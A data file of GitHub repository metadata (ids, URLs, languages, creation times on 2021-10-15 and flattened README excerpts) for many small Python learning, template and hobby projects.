417386976;Programs--Python;https://github.com/Vishnu777133/Programs--Python;Roff;2021-10-15T06:09:51Z;0;0;0;Programs-Python 
417346210;python_games;https://github.com/lumarini/python_games;Python;2021-10-15T02:34:18Z;0;0;0;
417392416;python_training;https://github.com/j551234/python_training;Jupyter Notebook;2021-10-15T06:34:31Z;0;0;0;
417407066;python_testing;https://github.com/dylan-pecqueux/python_testing;HTML;2021-10-15T07:28:37Z;0;0;0;gudlift-registration   Why This is a proof of concept (POC) project to show a light-weight version of our competition booking platform. The aim is the keep things as light as possible, and use feedback from the users to iterate.   Getting Started This project uses the following technologies:   Python v3.x+   Flask Whereas Django does a lot of things for us out of the box, Flask allows us to add only what we need.   Virtual environment This ensures you'll be able to install the correct packages without interfering with Python on your machine. Before you begin, please ensure you have this installed globally.     Installation   After cloning, change into the directory and type virtualenv .. This will then set up a a virtual python environment within that directory.   Next, type source bin/activate. You should see that your command prompt has changed to the name of the folder. This means that you can install packages in here without affecting affecting files outside. To deactivate, type deactivate   Rather than hunting around for the packages you need, you can install in one step. Type pip install -r requirements.txt. This will install all the packages listed in the respective file. If you install a package, make sure others know by updating the requirements.txt file. An easy way to do this is pip freeze > requirements.txt   Flask requires that you set an environmental variable to the python file. However you do that, you'll want to set the file to be server.py. Check here for more details   You should now be ready to test the application. In the directory, type either flask run or python -m flask run. The app should respond with an address you should be able to go to using your browser.     Current Setup The app is powered by JSON files. This is to get around having a DB until we actually need one. The main ones are:  competitions.json - list of competitions clubs.json - list of clubs with relevant information. You can look here to see what email addresses the app will accept for login.    Testing You are free to use whatever testing framework you like-the main thing is that you can show what tests you are using. We also like to show how well we're testing, so there's a module called coverage you should add to your project.   
417412195;Python_training;https://github.com/quan216/Python_training;Python;2021-10-15T07:46:30Z;0;0;0;
417406929;python_3;https://github.com/Kn0pk1/python_3;;2021-10-15T07:28:04Z;0;0;0;python_3 
417400152;Tugas-Python;https://github.com/firdausrifqi/Tugas-Python;Jupyter Notebook;2021-10-15T07:04:53Z;0;0;0;Tugas-Python Tugas 2 https://github.com/hackathonBI/CCS Buatlah file ipynb untuk dapat melakukan data understanding berikut ini :  Buatlah table list Top 5 Customers yang memiliki nilai transaksi paling banyak menggunakan dataframe pada python ! Buatlah list Top 5 Gas stations yang memiliki nilai transaksi paling banyak menggunakan dataframe pada python! Buatlah list Top 5 Jenis produk yang memiliki nilai transaksi paling banyak menggunakan dataframe pada python! Buatlah deskripsi statistik untuk masing masing hari (23,24,25,26) pada dataset transaction_1k! Carilah waktu terbaik (hari dan jam) dimana paling banyak user gas station melakukan transaksi ! Dari segi bisnis understanding, tujuan utama dari analisis data customer ini adalah?- Masukkan jawaban anda pada text di ipynb  
417357906;python-fundamental;https://github.com/krisnakumar88/python-fundamental;Python;2021-10-15T03:31:47Z;0;0;0;python-fundamental learn python fundamental 
417408760;Pbds_python;https://github.com/xeot10/Pbds_python;Python;2021-10-15T07:34:38Z;0;0;0;
417340612;python_session;https://github.com/galaxy3-net/python_session;;2021-10-15T02:05:58Z;0;0;0;python_session Discover Python Sessions with Cookies 
417369447;python-sample;https://github.com/hari221133/python-sample;Python;2021-10-15T04:35:52Z;0;0;0;python-sample 
417337300;learn-python;https://github.com/nongvantinh/learn-python;Python;2021-10-15T01:49:36Z;0;0;0;
417337601;python-scripts;https://github.com/mahar000/python-scripts;Python;2021-10-15T01:51:06Z;0;0;0;
417374023;python_scripts;https://github.com/kumarprincepk/python_scripts;Python;2021-10-15T05:02:16Z;0;0;0;python_scripts Here I write some python scripts that I learn and share the source code. 
417358285;Python-Projects;https://github.com/IsaacSarte/Python-Projects;Python;2021-10-15T03:33:55Z;0;0;0;Python-Projects Welcome to my Python Works 
417370528;python-tweeterest;https://github.com/bdlogicalerror/python-tweeterest;Python;2021-10-15T04:42:26Z;0;0;0;
417369466;python-sample;https://github.com/govardhancu/python-sample;Python;2021-10-15T04:36:00Z;0;0;0;python-sample 
417369730;algorithms-python;https://github.com/bekzodergashev1/algorithms-python;Python;2021-10-15T04:37:48Z;0;0;0;algorithms-python Data-structures and algorithms in Python 
417414139;Python-Ohk;https://github.com/june3011/Python-Ohk;Python;2021-10-15T07:53:20Z;0;0;0;
417350482;python-remotecmd;https://github.com/dot-github/python-remotecmd;Python;2021-10-15T02:55:33Z;0;0;0;python-remotecmd windows some remote cmd program i made in like 15 min cmdtoggle = toggles between cmd and message for server when in non cmd mode type {messagetext}|{messagetitle} for a window to appear on clients device so yeah thats it... just a thing i made because i have nothing else to do 
417408689;Python_Basic;https://github.com/darkfireZB/Python_Basic;Python;2021-10-15T07:34:21Z;0;0;0;Python学习资料———有需要请点击Star！！ 
417401531;python_3;https://github.com/AlexanderKartashov2003/python_3;;2021-10-15T07:09:57Z;0;0;0;python_3 
417358017;python_tester;https://github.com/banx9x/python_tester;Jupyter Notebook;2021-10-15T03:32:22Z;0;0;0;
417369430;demo_python;https://github.com/abzir/demo_python;Python;2021-10-15T04:35:47Z;0;0;0;demo_python 
417350353;nft_python;https://github.com/henryf10h/nft_python;;2021-10-15T02:54:57Z;0;0;0;nft_python Generative art project with solidity and python. 
417369449;python---class;https://github.com/abhishek-505/python---class;;2021-10-15T04:35:53Z;0;0;0;python---class 
417396715;HelloPython;https://github.com/t19cs043/HelloPython;;2021-10-15T06:52:29Z;0;0;0;
417343040;intermediate-python;https://github.com/romeopenheiro/intermediate-python;Python;2021-10-15T02:18:35Z;0;0;0;Intermediate Python (2021-10-15) The course Intermediate Python has teaching material that is available at Intermediate Python Preparation Make sure that you have Anaconda Python 3 installed and working before the sessions starts (or another way of writing and executing Python scripts). The instructions for installing Anaconda are available for Linux for Windows and for MacOS. Ensure that you have gone through the setting up of JuypterLab as in the material so that when we start the session, you're ready to go. There's a video going through this on YouTube. Also, check that you are able to write and run Python scripts as shown in this video. 
417397624;learnig-python;https://github.com/MOHAMMADArsalan/learnig-python;Python;2021-10-15T06:55:59Z;0;0;0;
417388747;python-visualization;https://github.com/datarian-kr/python-visualization;Jupyter Notebook;2021-10-15T06:18:15Z;0;0;0;python-visualization 
417390383;python-os;https://github.com/Nielzo333/python-os;Python;2021-10-15T06:25:42Z;0;0;0;python-os Its a simple python3 script for shell tasks in python using the os 
417357387;Python.py;https://github.com/aleg645/Python.py;;2021-10-15T03:29:15Z;0;0;0;Python.py 
417360788;hw-python;https://github.com/artak10t/hw-python;Python;2021-10-15T03:47:55Z;0;0;0;https://github.com/artak10t/hw-python 
417373351;python-yapi;https://github.com/hanzhichao/python-yapi;Python;2021-10-15T04:58:38Z;0;0;0;python-yapi python操作yapi库 
417396787;HelloPython;https://github.com/t19cs026/HelloPython;;2021-10-15T06:52:43Z;0;0;0;
417381389;exercices_python;https://github.com/masedki/exercices_python;Jupyter Notebook;2021-10-15T05:43:03Z;0;0;0;
417382270;template-python;https://github.com/nelkinda/template-python;Makefile;2021-10-15T05:47:15Z;0;0;0;template-python Project template for Python projects. Features  Supports TDD using Python Unittest. Supports BDD using Behave. Coverage Report. Static Code Analysis using mypy and prospector. Supports virtual environment. Incremental Makefile. Supports SonarQube, can run SonarQube locally via Docker.  
417361010;Python_Intro;https://github.com/wfkelly12/Python_Intro;Python;2021-10-15T03:49:14Z;0;0;0;Python_Intro Introduction to Python This repository provides examples of Python Scripts. 
417318259;18_Python;https://github.com/hannahsylee/18_Python;Python;2021-10-15T00:09:24Z;0;0;0;
417341253;python-da;https://github.com/Wenbo-Ge/python-da;Python;2021-10-15T02:09:19Z;0;0;0;
417350345;Python_Exercises;https://github.com/dbabhijit/Python_Exercises;Python;2021-10-15T02:54:54Z;0;0;0;Python_Exercises Python exercises with Sarfraaz 
417363370;pro_python;https://github.com/ngum-eufresia/pro_python;;2021-10-15T04:02:00Z;0;0;0;pro_python 100 days of python coding, Udemy course 
417340813;hwPYTHON;https://github.com/meow2501/hwPYTHON;Python;2021-10-15T02:06:58Z;0;0;0;HwPYTHON Name: An Le Github URL: https://github.com/meow2501/hwPYTHON 
417382861;python_demo;https://github.com/HandsomeMars/python_demo;Python;2021-10-15T05:50:42Z;0;0;0;python_demo python学习 
417406535;Learning-Python;https://github.com/OscarPradel/Learning-Python;;2021-10-15T07:26:53Z;0;0;0;Learning-Python Messing around with Python while following a Udemy course 
417389340;python.flask;https://github.com/SeungGyun/python.flask;Python;2021-10-15T06:21:05Z;0;0;0;"python.flask   간단한 API 작성시 유리함   웹서비스 미들웨어랑 같이 쓰는걸 장려  uwsg <- 연결 하니 잘 안되서 flask , ngnix만 사용했음    ngnix 설정 /etc/nginx/conf.d upstream etl_api { server localhost:32002; # server localhost:32002; } server { listen 32006 default_server; access_log /var/log/nginx/access.log; error_log /var/log/nginx/error.log; location / { proxy_pass_header Server; proxy_set_header Host $http_host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Scheme $scheme; proxy_pass http://etl_api; } }   "
417328726;algorithm_python;https://github.com/leg0las89/algorithm_python;Python;2021-10-15T01:05:54Z;0;0;0;
417347385;BeginPython;https://github.com/gilbertrendon/BeginPython;Python;2021-10-15T02:40:08Z;0;0;0;
417320354;Python-Crash-Course;https://github.com/Playboi-Pirate/Python-Crash-Course;;2021-10-15T00:20:56Z;0;0;0;"Python-Crash-Course Going through the book ""Python Crash Course"" by Eric Matthes "
417350297;Decision-tree_Python_DS;https://github.com/Chethan1982/Decision-tree_Python_DS;Jupyter Notebook;2021-10-15T02:54:38Z;0;0;0;Decision-tree_Python_DS Added Python code and Problem statement. Added Data set for company datset and Frud dataset  
417382587;gitpod-template-python-flask;https://github.com/tommytwoeyes/gitpod-template-python-flask;Python;2021-10-15T05:48:58Z;0;0;0;"A Python Flask template on Gitpod This is a Python Flask template configured for ephemeral development environments on Gitpod. Next Steps Click the button below to start a new development environment:  Get Started With Your Own Project A new project Click the above ""Open in Gitpod"" button to start a new workspace. Once you're ready to push your first code changes, Gitpod will guide you to fork this project so you own it. An existing project To get started with Python Flask on Gitpod, add a .gitpod.yml file which contains the configuration to improve the developer experience on Gitpod. To learn more, please see the Getting Started documentation. "
417370908;10-14-python-class;https://github.com/rlawnsgh714/10-14-python-class;Python;2021-10-15T04:44:34Z;0;0;0;python-class 
417377979;electron-python-template;https://github.com/phanirithvij2000/electron-python-template;TypeScript;2021-10-15T05:24:31Z;0;0;0;"${GITHUB_REPO_NAME} Setup First Use as template Linux python3 -m venv venv ./venv/bin/activate python -m pip install -U pip python-dotenv python-magic Windows python3 -m venv venv .\venv\Scripts\activate.bat python -m pip install -U pip python-dotenv python-magic-bin Template configuration (REQUIRED): Look at config/ folder and change all of them. Then use python scripts/project_replace.py -h # -r -v -i This will replace all the project variables with values from the config/ files. Push your local changes git add . git commit -m ""configure project""  Setup actions secrets mv config/secrets.env .env # Enter github actions secrets # Publish secrets to repo python ../scripts/setup_actions_secrets.py "
417317454;Python_Advanced2;https://github.com/vmakksimov/Python_Advanced2;;2021-10-15T00:05:21Z;0;0;0;
417357010;teach-me-python;https://github.com/arpitmohapatra/teach-me-python;;2021-10-15T03:27:07Z;0;0;0;teach-me-python Learning some python stuff 
417335158;My-Python-Quiz;https://github.com/YoshithaRathnayake/My-Python-Quiz;Python;2021-10-15T01:38:30Z;0;0;0;My-Python-Quiz Hi, I am Yoshitha Rathnayake. This is my Quiz that I made using Python (Language). 
417370431;Python_dataAnalysis;https://github.com/nice3dol/Python_dataAnalysis;Jupyter Notebook;2021-10-15T04:41:53Z;1;1;0;Python_dataAnalysis 
417360600;Python-Facebook-Poster;https://github.com/jakDev003/Python-Facebook-Poster;Python;2021-10-15T03:46:58Z;0;0;0;Python-Facebook-Poster Python script to automate posting to messages to events or pages in Facebook 
417353985;python-qyxhTr;https://github.com/tryspidy/python-qyxhTr;Python;2021-10-15T03:12:05Z;0;0;0;
417403815;API_Python_Tle;https://github.com/panachai25/API_Python_Tle;Python;2021-10-15T07:17:55Z;0;0;0;API_Python_Tle 
417347365;file_handler-python;https://github.com/markodevcic/file_handler-python;Python;2021-10-15T02:40:01Z;0;0;0;
417374471;LeetCode-Problems-Python;https://github.com/Pavanyeluri11/LeetCode-Problems-Python;Jupyter Notebook;2021-10-15T05:04:32Z;0;0;0;This Repo Contains python code for some of the leetcode problems. 
417397737;python_basics_homework;https://github.com/DamirKozhagulov/python_basics_homework;Python;2021-10-15T06:56:20Z;0;0;0;python_basics_homework 
417382687;python_selenium_example;https://github.com/Zobaid/python_selenium_example;Python;2021-10-15T05:49:36Z;0;0;0;python_selenium_example install librarires in a virtual environment run python scrapper_edmund.py 
417404006;python_playground_4;https://github.com/Reunkedze/python_playground_4;;2021-10-15T07:18:34Z;0;0;0;
417353588;Curso-Python-Exercicios-Praticados;https://github.com/JamesonSantos/Curso-Python-Exercicios-Praticados;Python;2021-10-15T03:10:15Z;1;1;0;Curso-Python-Exercicios-Praticados Exercícios praticados durante o curso de Python 
417377797;python_AutoTrade;https://github.com/jke23/python_AutoTrade;Python;2021-10-15T05:23:31Z;0;0;0;
417394970;python-basic-assignment-25;https://github.com/tharindu-frd/python-basic-assignment-25;;2021-10-15T06:45:15Z;0;0;0;
417415641;DrawPikachuPython;https://github.com/ngoctienTNT/DrawPikachuPython;Python;2021-10-15T07:58:08Z;0;0;0;DrawPikachuPython 
417370018;python-sonar-projects;https://github.com/simplestacks/python-sonar-projects;Python;2021-10-15T04:39:23Z;0;0;0;
417317349;python-class-dawn;https://github.com/sebastiaan-lampo/python-class-dawn;Jupyter Notebook;2021-10-15T00:04:43Z;0;0;0;Repository for class.  
417413437;my-hola-python;https://github.com/bettyit/my-hola-python;Python;2021-10-15T07:51:00Z;0;0;0;Hello, World (Python/Flask) This is a Python/Flask template for building a microservice in Kubernetes and Docker. This template is designed for use with Forge, Telepresence, and Ambassador. Repository structure The main files in this repository are:  Dockerfile specifies how the application is built and packaged k8s/deployment.yaml contains a templated Kubernetes manifest, with additional annotations for configuring Ambassador service.yaml contains values (typically configured by a developer) that will be instantiated into the Kubernetes manifest app.py is the actual Python/Flask application  License Licensed under Apache 2.0. Please see LICENSE for details. 
417380743;python-basic-assignment-21;https://github.com/tharindu-frd/python-basic-assignment-21;Jupyter Notebook;2021-10-15T05:39:46Z;0;0;0;
417359608;cmpe131-hw-python;https://github.com/skiffin-git/cmpe131-hw-python;Python;2021-10-15T03:41:32Z;0;0;0;
417360444;python_lesson_12_Pro;https://github.com/vv31415926/python_lesson_12_Pro;Python;2021-10-15T03:46:02Z;0;0;0;python_lesson_12_Pro 
417329822;st_it_python;https://github.com/lucassiano00/st_it_python;;2021-10-15T01:11:25Z;0;0;0;st_it_python Processo seletivo ST IT 
417372329;Python_Rename_File;https://github.com/ShenZheng2000/Python_Rename_File;Python;2021-10-15T04:52:37Z;0;0;0;Python_Rename_File This is a repository that shows different Pythonic ways to rename files in a folder. 
417329934;python-opencv-project;https://github.com/ariwijaya82/python-opencv-project;Python;2021-10-15T01:12:09Z;0;0;0;OpenCV project This repository is made for complete visual programming course project description  opencv_basic: this folder contain basic opencv program in python background_substruction: count car that pass the road  
417342059;curso_gee_python;https://github.com/bismarksr17/curso_gee_python;Jupyter Notebook;2021-10-15T02:13:35Z;0;0;0;curso_gee_python Archivos de curso de teledetección con GEE y Python 
417336804;python-random-quote;https://github.com/dorinvesting/python-random-quote;Python;2021-10-15T01:47:00Z;0;0;0;Let's Write a Python Quote Bot! This repository will get you started with building a quote bot in Python. It's meant to be used along with the Learning Lab intro to Python. When complete, you'll be able to grab random quotes from the command line, like this:  $ python get-quote.py Keep it logically awesome $ python get-quote.py Speak like a human  Start the Tutorial You can find your next step in this repo's issues! 
417409845;practise4_python;https://github.com/dramaturg12/practise4_python;;2021-10-15T07:38:24Z;0;0;0;
417396408;UPS-Openshift-Audit_Python;https://github.com/bschran17/UPS-Openshift-Audit_Python;Python;2021-10-15T06:51:22Z;0;0;0;UPS-Openshift-Audit_Python 
417387895;Python_zad2;https://github.com/UnderMan4/Python_zad2;;2021-10-15T06:14:16Z;0;0;0;
417379254;Udemy-Python-100;https://github.com/Lamsauce/Udemy-Python-100;;2021-10-15T05:31:16Z;0;0;0;
417369810;SWS-Mensa-Python;https://github.com/SteidleR/SWS-Mensa-Python;Python;2021-10-15T04:38:17Z;0;0;0;"SWS Canteen Parser Python code to fetch menu from sws2.maxmanager.xyz. Documentation Initialize browser Initialize a new selenium webdriver (chrome) object. browser = init_browser() Alternative: chrome_service = webdriver.chrome.service.Service(executable_path=ChromeDriverManager().install()) browser = webdriver.Chrome(service=chrome_service) Get canteen locations Get all available canteen locations with location id \ locations = get_locations(browser) Example dictionary of locations {   2: 'MENSA STUTTGART-VAIHINGEN',   16: 'MENSA CENTRAL',    4: 'MENSA MUSIKHOCHSCHULE',   7: 'MENSA KUNSTAKADEMIE',    1: 'MENSA LUDWIGSBURG',    6: 'MENSA FLANDERNSTRAßE',    9: 'MENSA ESSLINGEN STADTMITTE',    12: 'MENSA AM CAMPUS HORB',    13: 'MENSA GöPPINGEN',    21: 'FOODTRUCK' } Get today's menu Get a dictionary of today's menu with allergens \ menu = get_today_menu(browser, 16, ""en"") Example dictionary of menu [   {     'category': 'Main dish',      'meal': 'Vegetable sitr fry sweet sour',      'ingredients': []   },   {     'category': 'Main dish',      'meal': 'Omelette with leaf spinach and salt potatoes',      'ingredients': ['egg', 'milk und lactose', 'wheat']   },    {     'category': 'Side dish',      'meal': 'pumpkin carrots vegetable',      'ingredients': []   },    {     'category': 'Dessert',      'meal': 'vanilla pudding',      'ingredients': ['milk und lactose']   } ] "
417336381;My-Python-Calculator;https://github.com/YoshithaRathnayake/My-Python-Calculator;Python;2021-10-15T01:44:50Z;0;0;0;My-Python-Calculator Hi, I am Yoshitha Rathnayake. This is my Calculator that I made using Python (Language). 
417375725;Python_Practice_I;https://github.com/tokyokim0226/Python_Practice_I;;2021-10-15T05:11:30Z;0;0;0;
417317816;python-project-automation;https://github.com/Aj-Nunez/python-project-automation;;2021-10-15T00:07:16Z;0;0;0;
417330094;docker-python-example;https://github.com/aalonzolu/docker-python-example;Python;2021-10-15T01:13:04Z;0;0;1;docker-python-example Docker Python Example Presentación https://docs.google.com/presentation/d/1HKkCydG5-FKnqMciWNQkLDoZRLhYYGm6i4GYrMd86fc/edit?usp=sharing 
417414035;python_playground3;https://github.com/ura300/python_playground3;;2021-10-15T07:52:58Z;0;0;0;
417409587;Python-Google-Blogger-Automation;https://github.com/PopoolaIbrahim/Python-Google-Blogger-Automation;Python;2021-10-15T07:37:30Z;0;0;0;
417415190;Weather-app-python;https://github.com/Anantu05/Weather-app-python;Python;2021-10-15T07:56:41Z;0;0;0;
417319257;OficinaPythonFlask;https://github.com/EduardoKuster/OficinaPythonFlask;Python;2021-10-15T00:14:38Z;0;0;0;
417331846;DSA-with-Python;https://github.com/msboffl/DSA-with-Python;Python;2021-10-15T01:22:35Z;0;0;0;DSA-with-Python 
417391775;python-basci-assignment-24;https://github.com/tharindu-frd/python-basci-assignment-24;;2021-10-15T06:31:39Z;0;0;0;
417404141;python-random-quote;https://github.com/XueniXu/python-random-quote;Python;2021-10-15T07:19:00Z;0;0;0;Let's Write a Python Quote Bot! This repository will get you started with building a quote bot in Python. It's meant to be used along with the Learning Lab intro to Python. When complete, you'll be able to grab random quotes from the command line, like this:  $ python get-quote.py Keep it logically awesome $ python get-quote.py Speak like a human  Start the Tutorial You can find your next step in this repo's issues! 
417326623;100daysofcode-python;https://github.com/caroldf07/100daysofcode-python;Python;2021-10-15T00:54:56Z;0;0;1;100daysofcode-python Day 01 - Band Name Generator ✅  Day 02 - Tip Calculator ✅  Day 03 - Treasure Island ✅ The Flow  The Solution  
417412058;python-simple-password-generator;https://github.com/DiogoC7/python-simple-password-generator;Python;2021-10-15T07:46:02Z;0;0;0;
417397787;ebs-python-internship;https://github.com/wetal-paraskiv/ebs-python-internship;Python;2021-10-15T06:56:30Z;0;0;0;ebs-python-internship ebs-python-internship test project 
417388125;my-python-prog;https://github.com/Digvijayjadhav119/my-python-prog;;2021-10-15T06:15:26Z;0;0;0;my-python-prog 
417317725;python-coffee_machine-project;https://github.com/RAYMOND-A/python-coffee_machine-project;Python;2021-10-15T00:06:52Z;0;0;0;"""# python-coffee_machine-project"" "
417341630;machine-learning-trees-python;https://github.com/tompollard/machine-learning-trees-python;Python;2021-10-15T02:11:25Z;0;0;0;Introduction to machine learning in Python  Thanks for contributing to The Carpentries Incubator! This repository provides a blank starting point for lessons to be developed here. A member of the Carpentries Curriculum Team will work with you to get your lesson listed on the Community Developed Lessons page and make sure you have everything you need to begin developing your new lesson. What to do next Before you begin developing your new lesson, here are a few things we recommend you do:   Decide on a title for your new lesson! Once you've chosen a new title, you can set the value for lesson_title in _config.yml  Add the URL to your built lesson pages to the repository description*  Add relevant topic tags to your lesson repository.  Fill in the fields marked FIXME in:  this README _config.yml    If you're going to be developing lesson material for the first time according to our design principles, consider reading the Carpentries Curriculum Development Handbook  Consult the Lesson Example website to find out more about working with the lesson template  If you are planning to write your lesson in RMarkdown, create a main branch and set this as the default branch in your repository settings  Update this README with relevant information about your lesson and delete this section  * To set the URL on GitHub, click the gear wheel button next to About on the right of the repository landing page. The lesson URL structure is https://carpentries-incubator.github.io/<repository-slug>: a repository at https://github.com/carpentries-incubator/new-lesson/ will have pages at the lesson URL https://carpentries-incubator.github.io/new-lesson/. Contributing We welcome all contributions to improve the lesson! Maintainers will do their best to help you if you have any questions, concerns, or experience any difficulties along the way. We'd like to ask you to familiarize yourself with our Contribution Guide and have a look at the more detailed guidelines on proper formatting, ways to render the lesson locally, and even how to write new episodes. Please see the current list of [issues][FIXME] for ideas for contributing to this repository. For making your contribution, we use the GitHub flow, which is nicely explained in the chapter Contributing to a Project in Pro Git by Scott Chacon. Look for the tag . This indicates that the maintainers will welcome a pull request fixing this issue. Maintainer(s) Current maintainers of this lesson are  Nathan Pollard Tom Pollard Alistair Johnson Marzyeh Ghassemi  Authors A list of contributors to the lesson can be found in AUTHORS Citation To cite this lesson, please consult with CITATION 
417372954;yaml-to-python;https://github.com/tonybutzer/yaml-to-python;Jupyter Notebook;2021-10-15T04:56:16Z;0;0;0;yaml-to-python layout functions in yaml - generate python code - graph it 
417385122;Web_server-using-python;https://github.com/Balajiigor/Web_server-using-python;Python;2021-10-15T06:01:35Z;0;0;0;Web_server-using-python 
417385824;CALCULATOR-DATA-FLAIR-PYTHON;https://github.com/adi171701/CALCULATOR-DATA-FLAIR-PYTHON;Python;2021-10-15T06:04:35Z;0;0;0;
417354011;python-dojo-book;https://github.com/zeninpalm/python-dojo-book;Jupyter Notebook;2021-10-15T03:12:11Z;0;0;0;
417398864;oop_project_based_python;https://github.com/pritom02bh/oop_project_based_python;;2021-10-15T07:00:47Z;0;0;0;
417386601;python-glm-project;https://github.com/Wade008/python-glm-project;Jupyter Notebook;2021-10-15T06:08:12Z;0;0;0;"python-glm-project Introduction: The purpose of this project is to develop a relatively simple way to access US Census Current Population Survey (CPS) data, with the aim of identifying drivers of wage levels in the US. This project will only focus on a small Generalized Linear Model (GLM); namely, the relationship between wage levels, the level of education and gender but the class below can also handle more complex models. Firstly, the methodology used to access and analyse the data will be outlined. The results of the analysis will then be discussed. Finally, a brief summary of the finding will be provided and ideas for future analysis discussed. Class: The class 'CPSAnalysis'is designed to allow quick access and analysis of the Current Population Survey (CPS) data. The class includes (as a default) a number variables; however, the variables can be changed, if required. The class also includes multiple methods that allow the user to plot a histogram and boxplot, fit a model, analyse the residuals of the model and show predictions. "
417357313;DQLAB-Python-Project;https://github.com/Arteewee/DQLAB-Python-Project;Jupyter Notebook;2021-10-15T03:28:51Z;0;0;0;Python-Project This is All My Python Project while i learning in DQLAB Online Course Data Science : Data Cleansing this project is about cleaning data Requirments  Python 3 Pandas Numpy Matplotlib Seaborns  Dataset https://dqlab-dataset.s3-ap-southeast-1.amazonaws.com/dqlab_telco.csv Data Science : Data Analysis COVID-19 in the World Requirments  Python 3 Pandas Numpy Matplotlib Seaborns  Dataset https://dqlab.id/data/covid19_worldwide_2020.json Result  Data_Analyst_Project_Business_Decision_Research Requirments  Python 3 Pandas Numpy Matplotlib Seaborns sklearn  Dataset https://storage.googleapis.com/dqlab-dataset/data_retail.csv 
417352468;kafka-python-test;https://github.com/DariusX/kafka-python-test;Python;2021-10-15T03:04:50Z;0;0;0;kafka-python-test Connect to Kafka from Python using confluent package  Set up a Kafka cluster that can be accessed via Username/Password, e.g. using Confluent Pay-as-you go Clone this repo, and open it in PyCharm Add the following environment variables to the runtime Configuration  BROKER_URL CLUSTER_USERNAME CLUSTER_PASSWORD    
417348451;python-coroutines-examples;https://github.com/ExtremelySunnyYK/python-coroutines-examples;Python;2021-10-15T02:45:19Z;0;0;0;Learnings and Projects with Asyncio, Requests, Aiohttp | Make faster API Calls Defintiions: Event Loop : We can let some stuff take a long time to do in the background. When its done, event loop wil pick up the event Blocking Call : A function that takes a long time to complete  Analogy: Synchronous: Cook rice then cook meat Asynchronous: Cook rice in the background, and cook meat. Check to see if rice is done  The general idea is that we have a bunch of functions that take a long time to complete. We want to run these functions in the background.  We define the functions as async functions. We can combine these functions into a task and add them to the event loop. We await the functions to complete. We run the functions in the background by using the event loop.  
417356629;NyumonPython3;https://github.com/developKenta/NyumonPython3;Python;2021-10-15T03:25:19Z;0;0;0;
417357351;WebScraping_using_Python;https://github.com/essien1990/WebScraping_using_Python;Jupyter Notebook;2021-10-15T03:29:05Z;0;0;0;WebScraping using Python  BeautifulSoup was used to scrape the content of the website, Requests was used to get the website URL, Pandas was used to store the scraped data into a dataframe The data was stored in Json and CSV file format SQLAlchemy was used to store the dataframe into PostgreSQL database! DataFrame stored in Database Weather DataFrame stored in Database Weather in Schema forecasts  
417343582;Python_100_day_practice;https://github.com/Skydrgon/Python_100_day_practice;;2021-10-15T02:21:21Z;0;0;0;Python_100_day_practice 根据骆昊老师的Python - 100天从新手到大师进行的练习 测试更改是否能看见 
417410295;python_project_template;https://github.com/Dumb-Tiger/python_project_template;Makefile;2021-10-15T07:40:04Z;0;0;0;Python Project Template A low dependency and really simple to start project template for Python Projects. See also  Flask-Project-Template for a full feature Flask project including database, API, admin interface, etc. FastAPI-Project-Template The base to start an openapi project featuring: SQLModel, Typer, FastAPI, JWT Token Auth, Interactive Shell, Management Commands.  HOW TO USE THIS TEMPLATE  DO NOT FORK this is meant to be used from Use this template feature.   Click on Use this template Give a name to your project (e.g. my_awesome_project recommendation is to use all lowercase and underscores separation for repo names.) Wait until the first run of CI finishes (Github Actions will process the template and commit to your new repo) If you want codecov Reports and Automatic Release to PyPI On the new repository settings->secrets add your PIPY_API_TOKEN and CODECOV_TOKEN (get the tokens on respective websites) Read the file CONTRIBUTING.md Then clone your new project and happy coding!   NOTE: WAIT until first CI run on github actions before cloning your new project.  What is included on this template?  🖼️ Templates for starting multiple application types:  Basic low dependency Python program (default) use this template Flask with database, admin interface, restapi and authentication use this template. or Run make init after cloning to generate a new project based on a template.   📦 A basic setup.py file to provide installation, packaging and distribution for your project. Template uses setuptools because it's the de-facto standard for Python packages, you can run make switch-to-poetry later if you want. 🤖 A Makefile with the most useful commands to install, test, lint, format and release your project. 📃 Documentation structure using mkdocs 💬 Auto generation of change log using gitchangelog to keep a HISTORY.md file automatically based on your commit history on every release. 🐋 A simple Containerfile to build a container image for your project. Containerfile is a more open standard for building container images than Dockerfile, you can use buildah or docker with this file. 🧪 Testing structure using pytest ✅ Code linting using flake8 📊 Code coverage reports using codecov 🛳️ Automatic release to PyPI using twine and github actions. 🎯 Entry points to execute your program using python -m <python_project_template> or $ python_project_template with basic CLI argument parsing. 🔄 Continuous integration using Github Actions with jobs to lint, test and release your project on Linux, Mac and Windows environments.   Curious about architectural decisions on this template? read ABOUT_THIS_TEMPLATE.md If you want to contribute to this template please open an issue or fork and send a PULL REQUEST.  ❤️ Sponsor this project  python_project_template   Awesome python_project_template created by Dumb-Tiger Install it from PyPI pip install python_project_template Usage from python_project_template import BaseClass from python_project_template import base_function  BaseClass().base_method() base_function() $ python -m python_project_template #or $ python_project_template Development Read the CONTRIBUTING.md file. 
417406140;python_data-1015-;https://github.com/Hanny95/python_data-1015-;Python;2021-10-15T07:25:41Z;0;0;0;python_data-1015- 
417397803;python-project-lvl1;https://github.com/swatch4/python-project-lvl1;;2021-10-15T06:56:35Z;0;0;0;Hexlet tests and linter status:  
417396668;simple-python-implementations;https://github.com/jdk1997/simple-python-implementations;Jupyter Notebook;2021-10-15T06:52:19Z;0;0;0;Simple Python implementations This repository has from scratch implementations of:  RandomSearch Cross-validation TF-IDF (Term frequency-inverse document frequency)  
417320528;python-review-part-1;https://github.com/ancyneha/python-review-part-1;Jupyter Notebook;2021-10-15T00:21:51Z;0;0;0;python-review-part-1 
417385860;new_python_book;https://github.com/KoKim2020/new_python_book;Python;2021-10-15T06:04:48Z;0;0;0;
417344964;Rebuild-advanced-CV-python;https://github.com/Brettict/Rebuild-advanced-CV-python;Python;2021-10-15T02:28:00Z;1;1;0;"Rebuild-advanced-CV-python go for original website here https://www.computervision.zone/courses/advance-computer-vision-with-python/ I just use his code to suit for my PC and run successfully, and I am also a fresh in CV area. Please note that I am not the Author, if you have any questions please contact the auther via the email. contact@computervision.zone contact@computervision.zone; #Here is my env 1.anaconda-win 10 2.opencv-python 3.python 3.7 4.a hikvision usb camera Appreciation: Qian Li for assistance "
